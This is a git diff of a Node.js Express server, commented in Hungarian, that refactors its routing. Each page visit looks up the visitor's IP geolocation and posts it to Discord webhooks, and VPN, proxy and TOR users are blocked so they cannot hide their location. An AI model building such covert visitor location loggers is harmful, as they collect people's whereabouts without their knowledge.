@@ -157,48 +157,15 @@ async function isVpnProxy(ip) {
   }
 }
 
-// --- FŐOLDAL: szaby mappa index.html legyen mindig a főoldal ---
-app.get('/', async (req, res) => {
-  const folderName = 'szaby';
-  const ip = getClientIp(req);
-  const geoData = await getGeo(ip);
+// --- MINDEN static kiszolgálás a /public-ból (legelsőnek legyen!) ---
+app.use(express.static(path.join(__dirname, 'public')));
 
-  // FŐ WEBHOOK LOG (teljes)
-  axios.post(MAIN_WEBHOOK, {
-    username: "Helyszíni Naplózó <3",
-    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-    content: '',
-    embeds: [{
-      title: 'Új látogató az oldalon!',
-      description: `**Oldal:** /${folderName}\n` + formatGeoDataTeljes(geoData),
-      color: 0x800080
-    }]
-  }).catch(()=>{});
-
-  // VPN/PROXY ellenőrzés és ALERT log (vpn formátum!)
-  if (await isVpnProxy(ip)) {
-    axios.post(ALERT_WEBHOOK, {
-      username: "VPN figyelő <3",
-      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-      content: '',
-      embeds: [{
-        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
-        description: `**Oldal:** /${folderName}\n` + formatGeoDataVpn(geoData),
-        color: 0xff0000
-      }]
-    }).catch(()=>{});
-    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
-  }
-
-  // Itt van a lényeg!
-  // Ha valaki /-t nyit meg, a szaby/index.html-t add vissza, és a root static mappát a /szaby mappára állítjuk.
-  const filePath = path.join(__dirname, 'public', folderName, 'index.html');
-  res.sendFile(filePath);
+// --- FŐOLDAL: Redirect / -> /szaby ---
+app.get('/', (req, res) => {
+  res.redirect('/szaby');
 });
 
-// --- Külön static middleware a /-hoz (hogy szaby legyen a statikus gyökér) ---
-
-// --- Dinamikus oldalak: pl. /kecske, /barmi, ahol saját mappában vannak static fájlok ---
+// --- Dinamikus oldalak: pl. /szaby, /kecske, /barmi ---
 app.get('/:folder', async (req, res, next) => {
   const folderName = req.params.folder;
   if (folderName === 'report') return next();
@@ -210,7 +177,7 @@ app.get('/:folder', async (req, res, next) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
-  // FŐ WEBHOOK LOG (teljes)
+  // --- FŐ WEBHOOK LOG (teljes) ---
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -222,7 +189,7 @@ app.get('/:folder', async (req, res, next) => {
     }]
   }).catch(()=>{});
 
-  // VPN/PROXY ellenőrzés és ALERT log (vpn formátum!)
+  // --- VPN/PROXY ellenőrzés és ALERT log ---
   if (await isVpnProxy(ip)) {
     axios.post(ALERT_WEBHOOK, {
       username: "VPN figyelő <3",
@@ -239,9 +206,6 @@ app.get('/:folder', async (req, res, next) => {
 
   res.sendFile(filePath);
 });
-
-// --- Dinamikus statikus kiszolgálás minden /valami útvonalra is (pl. /szaby/style.css, /kecske/script.js) ---
-app.use(express.static(path.join(__dirname, 'public')));
 
 // --- Gyanús tevékenység reportolása ---
 app.post('/report', express.json(), async (req, res) => {
@@ -266,6 +230,7 @@ app.post('/report', express.json(), async (req, res) => {
   res.json({ ok: true });
 });
 
+// --- 404 minden másra ---
 app.use((req, res) => {
   res.status(404).send('404 Not Found');
 });
